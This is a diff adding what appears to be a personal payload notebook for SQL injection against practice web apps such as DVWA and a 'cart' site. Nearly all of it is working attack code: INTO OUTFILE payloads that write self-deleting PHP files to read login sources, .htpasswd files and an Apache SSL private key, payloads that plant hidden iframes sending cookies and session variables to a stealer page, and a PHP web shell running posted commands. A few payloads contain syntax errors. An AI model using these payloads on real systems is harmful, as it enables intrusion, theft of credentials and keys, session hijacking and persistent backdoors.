@@ -1,0 +1,116 @@
+dvwa--------------------------------------------------------------------
+NULL' UNION SELECT '<!DOCTYPE html><head></head><body>', '<?php echo "source=".htmlentities(file_get_contents("login.php"));?></body></html>' INTO OUTFILE '../../htdocs/DVWA/out1.php'#
+
+
+NULL' UNION SELECT '<!DOCTYPE html><head></head><body>', '<?php file_get_contents("vulnerabilities/sqli/index.php"))."<iframe src=\'localhost/stealWithCSRF.php\'></iframe>");?></body></html>' INTO OUTFILE '../../htdocs/DVWA/out3.php'#
+
+
+NULL' UNION SELECT '<!DOCTYPE html><head></head><body>', '<?php file_put_contents("vulnerabilities/sqli/index.php",file_get_contents("vulnerabilities/sqli/index.php")."                                                                                                                                                                                                                                                                                                                           <iframe id=\'D46GTR6IRXFKT7KCCYJC\'></iframe><script>document.addEventListener(\'onload\',document.getElementById(\'D46GTR6IRXFKT7KCCYJC\').setAttribute(\'src\',\'http://localhost/stealWithCSRF.php\'), false);</script>");?></body></html>' INTO OUTFILE '../../htdocs/DVWA/out3.php'#
+
+
+------
+NULL' UNION SELECT '<!DOCTYPE html><head></head><body>', '<?php file_put_contents("vulnerabilities/sqli/index.php",file_get_contents("vulnerabilities/sqli/index.php")."                                                                                                                                                                                                      <iframe style=\'border:0px;height:0px;width:0px;\' id=\'D46GTR6IRXFKT7KCCYJC\'></iframe><script>document.addEventListener(\'onload\',document.getElementById(\'D46GTR6IRXFKT7KCCYJC\').setAttribute(\'src\',\'http://localhost/stealWithCSRF.php?\'+encodeURIComponent(document.cookie)), false);</script>");?></body></html>' INTO OUTFILE '../../htdocs/DVWA/out4.php'#
+-------
+
+
+NULL UNION SELECT '<!DOCTYPE html><head></head><body><?php echo htmlentities(file_get_contents("login.php")); sleep(20); unlink(__FILE__); ?></body></html>','','','','' INTO OUTFILE '../../htdocs/testout.php'
+
+
+NULL UNION SELECT '<!DOCTYPE html><head></head><body>','<?php','echo "source=".htmlentities(file_get_contents("forbidden/.htpasswd")); sleep(20); unlink(__FILE__); ','?>','</body></html>' INTO OUTFILE '../../htdocs/testout.php'
+
+NULL UNION SELECT '<!DOCTYPE html><head></head><body>','<?php','echo "source=".htmlentities(file_get_contents("../../WINDOWS/WindowsUpdate.log")) sleep(20); unlink(__FILE__); ;','?>','</body></html>' INTO OUTFILE '../../htdocs/testout.php'
+
+
+
+
+----------------------------------------cart-----------------------------------
+NULL UNION SELECT '<!DOCTYPE html><head></head><body><?php echo htmlentities(file_get_contents("login.php")); sleep(5); unlink(__FILE__); ?></body></html>','','','','' INTO OUTFILE '../../htdocs/testout.php'
+-
+NULL UNION SELECT '<!DOCTYPE html><head></head><body><?php echo "source=".htmlentities(file_get_contents("forbidden/.htpasswd")); sleep(5); unlink(__FILE__); ?></body></html>','','','','' INTO OUTFILE '../../htdocs/testout.php'
+-
+NULL UNION SELECT '<!DOCTYPE html><head></head><body><?php echo "source=".htmlentities(file_get_contents("../../WINDOWS/WindowsUpdate.log")); sleep(5); unlink(__FILE__);?></body></html>','','','','' INTO OUTFILE '../../htdocs/testout.php'
+-
+NULL UNION SELECT '<!DOCTYPE html><head></head><body><?php echo "source=".htmlentities(file_get_contents("../apache/conf/ssl.key/server.key")); sleep(5); unlink(__FILE__);?></body></html>','','','','' INTO OUTFILE '../../htdocs/testout.php'
+-
+NULL UNION SELECT '<!DOCTYPE html><head></head><body><?php echo "source=".htmlentities(file_get_contents("../security/webdav.htpasswd")); sleep(5); unlink(__FILE__);?></body></html>','','','','' INTO OUTFILE '../../htdocs/testout.php'
+
+
+-----------------self destructing php file vs using xss to get PHPSESSID-------------------------
+NULL UNION SELECT '<!DOCTYPE html><head></head><body>','<?php','echo htmlentities(file_get_contents("product2.php"));file_put_contents("product2.php",file_get_contents("product2.php")."                                                                                                                                                                                                                                                                                                                            <iframe style=\'border:0px;width=0px;height:0px;\' id=\'evil\'></iframe><script>var evilsite=\'stealWithCSRF.php?\';evilsite%2B=encodeURIComponent(document.cookie);document.getElementById(\'evil\').setAttribute(\'src\', evilsite);</script>"); sleep(20); unlink(__FILE__);','?>','</body></html>' INTO OUTFILE '../../htdocs/testout.php'
+----------------------------------------------------------------
+
+--other opts to clean up:
+-linux
+system("rm -rf ".escapeshellarg($dir));
+-windows
+system('rmdir '.escapeshellarg($path).' /s /q');
+-----------------------------------------------------
+
+			
+
+
+---------------------------------------------------------------------------------------------------sql injection wrtting arbitrary self destructiong php file that writes php to a site's own page that injects an iframe and stacks get params of all cookie and session variables up to 3rd layer of sess var arrays---todo-make recursive to get all layers
+---------------------------------------------------------------------------------------------------
+:::::::::::::::::::::long:::::::::::::::::::::::::::::::::::::::::::::::::
+NULL UNION SELECT '<!DOCTYPE html><head></head><body>
+<?php 
+echo htmlentities(file_get_contents("product2.php"));
+				//  \'quote what inner php will be in so $vars not interpolated or sql terminated 
+$toAdd=file_get_contents("product2.php").\'<iframe style="border:0px;width=0px;height:0px;" src=<?php	$payload=""; 
+foreach($_COOKIE as $k=>$v){
+	$payload.="%26CV".$k."=".$v;	//%26 is '&' (since this is a post so doesn't split)
+}
+foreach($_SESSION as $k=>$v){
+	if (is_array($v)){
+		$payload.="%26SA".$k."=ARR";
+		foreach($v as $vk=>$vv){
+			if(is_array($vv)){
+				$payload.="%26SAA".$vk."=AA";
+				foreach($vv as $vvk=>$vvv){
+					$payload.="%26SAV".$vvk."=".$vvv;
+				}
+			}else{
+				$payload.="%26SAV".$vk."=".$vv;
+			}
+		}
+	}else{
+		$payload.="%26SV".$k."=".$v;
+	}
+} 
+echo "stealWithCSRF.php?".$payload."></iframe>";
+?>\';
+file_put_contents("product2.php",$toAdd);
+sleep(20);
+unlink(__FILE__);
+?>
+</body></html>','','','','' 
+INTO OUTFILE '../../htdocs/testout.php'
+================================================================================
+NULL UNION SELECT '<!DOCTYPE html><head></head><body><?php echo htmlentities(file_get_contents("product2.php"));$toAdd=file_get_contents("product2.php").\'                                                                                                                                                                                                                                                                                                                                                                                                                                               <iframe style="border:0px;width=0px;height:0px;" src=<?php $payload=""; foreach($_COOKIE as $k=>$v){$payload.="%26CV".$k."=".$v;}foreach($_SESSION as $k=>$v){if (is_array($v)){$payload.="%26SA".$k."=ARR";foreach($v as $vk=>$vv){if(is_array($vv)){$payload.="%26SAA".$vk."=AA";foreach($vv as $vvk=>$vvv){$payload.="%26SAV".$vvk."=".$vvv;}}else{$payload.="%26SAV".$vk."=".$vv;}}}else{$payload.="%26SV".$k."=".$v;}} echo "stealWithCSRF.php?".$payload."></iframe>"; ?>\';file_put_contents("product2.php",$toAdd);sleep(20);unlink(__FILE__);?></body></html>','','','','' INTO OUTFILE '../../htdocs/testout.php'	
+=====================================================================================
+
+
+----------------------make myshell.php (NOT self cleaning)-----------------------------
+::::::::::::::::::::::::::::::::::::::long::::::::::::::::::::::::::::::::::::::::
+<!DOCTYPE html><head></head><body>
+<form action="shellTest.php" method="post">
+	<input type="text" style="width:1000px;" name="cmd"/>
+	<input type="submit" />
+</form>
+<?php
+if (isset($_POST['cmd'])){
+	$output=[];
+	$status=0;
+	exec($_POST['cmd'], $output, $status);
+	$result="<div><b>Output=</b>";
+	foreach($output as $i){
+		$result.="<br />".$i;
+	}
+	$result.="<br /><b>Status=</b><br />".$status."</div>";
+	echo $result;
+}
+?>
+</body></html>	
+=======================================================================================
+NULL UNION SELECT '<!DOCTYPE html><head></head><body><form action="myshell.php" method="post"><input type="text" style="width:1000px;" name="cmd"/><input type="submit" /></form><?php if (isset($_POST["cmd"])){$output=[];$status=0;exec($_POST["cmd"], $output, $status);$result="<div><b>Output=</b>";foreach($output as $i){$result.="<br />".$i;}$result.="<br /><b>Status=</b><br />".$status."</div>";echo $result;}?></body></html>','','','','' INTO OUTFILE '../htdocs/myshell.php'
+---------------------------------------------------------------------------------------
